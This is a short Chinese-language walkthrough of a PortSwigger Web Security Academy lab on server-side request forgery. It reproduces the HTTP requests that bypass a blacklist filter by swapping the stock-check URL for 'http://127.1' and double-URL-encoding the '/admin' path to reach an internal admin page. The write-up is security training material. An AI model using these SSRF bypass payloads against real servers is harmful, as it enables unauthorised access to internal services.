https://portswigger.net/web-security/learning-paths/ssrf-attacks/ssrf-attacks-circumventing-defenses/ssrf/lab-ssrf-with-blacklist-filter#

在这个 lab 中，我们可以控制一个包里的请求地址
```HTTP
POST /product/stock HTTP/1.1
Host: 0aef00ba046c187f81c5258b00190000.web-security-academy.net
Connection: keep-alive
Content-Length: 107
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"
Content-Type: application/x-www-form-urlencoded
sec-ch-ua-mobile: ?0
Accept: */*
Origin: https://0aef00ba046c187f81c5258b00190000.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aef00ba046c187f81c5258b00190000.web-security-academy.net/product?productId=3
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=Y5avoGLDROVyxmIWZc9C9u1xkKTNf7xJ

stockApi={{urlenc(http://stock.weliketoshop.net:8080/product/stock/check?productId=3&storeId=1)}}
```

我们的目标是连上 `/admin` ，不过，服务端把 `localhost` `127.0.0.1` `admin` 给ban了
对于 `127.0.0.1` ，我们可以尝试使用 `127.1` ，某些解析服务可能会帮我们将其填充成 `127.0.0.1`

```HTTP
POST /product/stock HTTP/1.1
Host: 0aef00ba046c187f81c5258b00190000.web-security-academy.net
Connection: keep-alive
Content-Length: 107
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"
Content-Type: application/x-www-form-urlencoded
sec-ch-ua-mobile: ?0
Accept: */*
Origin: https://0aef00ba046c187f81c5258b00190000.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aef00ba046c187f81c5258b00190000.web-security-academy.net/product?productId=3
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=Y5avoGLDROVyxmIWZc9C9u1xkKTNf7xJ

stockApi={{urlenc(http://127.1/product/stock/check?productId=3&storeId=1)}}
```

获得响应
```HTTP
HTTP/1.1 404 Not Found
Content-Type: application/json; charset=utf-8
Set-Cookie: session=UNnWCxBBwUzoKmu5M08P9p8WcQbwo5t0; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 11

"Not Found"
```

但是访问 `/admin` 仍然会被限制，可以使用双重url编码绕过
```HTTP
POST /product/stock HTTP/1.1
Host: 0aef00ba046c187f81c5258b00190000.web-security-academy.net
Connection: keep-alive
Content-Length: 107
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"
Content-Type: application/x-www-form-urlencoded
sec-ch-ua-mobile: ?0
Accept: */*
Origin: https://0aef00ba046c187f81c5258b00190000.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aef00ba046c187f81c5258b00190000.web-security-academy.net/product?productId=3
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=Y5avoGLDROVyxmIWZc9C9u1xkKTNf7xJ

stockApi={{urlenc(http://127.1/{{urlenc(admin)}})}}
```

---

> [!NOTE]
> 本次SSRF案例使用了 `127.1` 和 URL双重编码 绕过限制。
